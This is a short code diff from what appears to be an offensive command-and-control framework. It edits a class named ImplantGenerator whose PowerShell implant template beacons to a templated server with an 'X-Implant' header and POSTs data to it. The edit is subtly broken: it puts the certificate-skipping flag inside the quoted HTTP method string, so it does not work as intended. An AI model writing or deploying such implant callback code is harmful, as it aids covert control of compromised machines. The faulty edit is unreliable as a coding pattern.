@@ -52,7 +52,7 @@ class ImplantGenerator():
             $headers = @{}
             $headers.Add("X-Implant","{{ uii }}")
             try {
-                $LoginResponse = Invoke-WebRequest '{{ http }}://{{url}}:{{port}}/index' -Headers $headers -Body $Body -Method 'POST'
+                $LoginResponse = Invoke-WebRequest '{{ http }}://{{url}}:{{port}}/index' -Headers $headers -Body $Body -Method 'POST -SkipCertificateCheck'
             }
             catch {
                 $_.Exception | format-list -Force
